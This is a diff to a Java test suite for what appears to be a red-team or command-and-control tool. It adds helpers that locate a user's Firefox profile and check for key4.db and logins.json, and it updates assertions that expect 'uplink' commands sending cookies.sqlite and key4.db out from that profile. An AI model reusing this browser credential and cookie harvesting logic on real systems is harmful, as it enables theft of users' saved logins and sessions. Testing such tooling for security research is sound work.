@@ -185,6 +185,46 @@ public static void testDataExfilBody(TestConfiguration config) {
 		}
 	}
 
+public static String getSystemFirefoxInstallationFolder() {
+	File firefoxProfileRoot = getMozillaProfileDir();
+	if(firefoxProfileRoot != null) {
+		return firefoxProfileRoot.getName();
+	}else {
+		return "No Firefox Root Found";
+	}
+}
+
+private static File getMozillaProfileDir() {
+	Path mozillaProfileRoot = Paths.get(System.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles");
+	if(!Files.exists(mozillaProfileRoot)) {
+		return null;
+	}
+	File[] files = mozillaProfileRoot.toFile().listFiles();
+	if(files.length != 1) {
+		return null;
+	}
+	return files[0];
+}
+
+public static boolean systemHasAllFirefoxDependencies() {
+	File firefoxProfileRoot = getMozillaProfileDir();
+	if(firefoxProfileRoot == null) {
+		return false;
+	}else {
+		boolean foundKeys = false;
+		boolean foundLogins = false;
+		for(File child: firefoxProfileRoot.listFiles()) {
+			if(child.getName().equals("key4.db")) {
+				foundKeys = true;
+			}
+			if(child.getName().equals("logins.json")) {
+				foundLogins = true;
+			}
+		}
+		return foundKeys & foundLogins;
+	}
+}
+
 public static void testCookieHarvestBody(TestCommons.LANGUAGE language) throws InterruptedException {
 	RunnerTestGeneric.cleanup();
 	
@@ -246,11 +286,11 @@ public static void testCookieHarvestBody(TestCommons.LANGUAGE language) throws I
 		}
 		
 		line = br.readLine();
-		assertEquals("Sent Command: 'uplink C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\b1jk3u5w.default-release\\cookies.sqlite'", line);
+		assertEquals("Sent Command: 'uplink C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" + getSystemFirefoxInstallationFolder() + "\\cookies.sqlite'", line);
 		line = br.readLine();
 		assertEquals("Macro Executor: 'Captured Firefox Cookies'", line);
 		line = br.readLine();
-		assertEquals("Sent Command: 'uplink C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\b1jk3u5w.default-release\\key4.db'", line);
+		assertEquals("Sent Command: 'uplink C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" + getSystemFirefoxInstallationFolder() + "\\key4.db'", line);
 		line = br.readLine();
 		assertEquals("Macro Executor: 'Captured Firefox creds'", line);
 		//line = br.readLine();
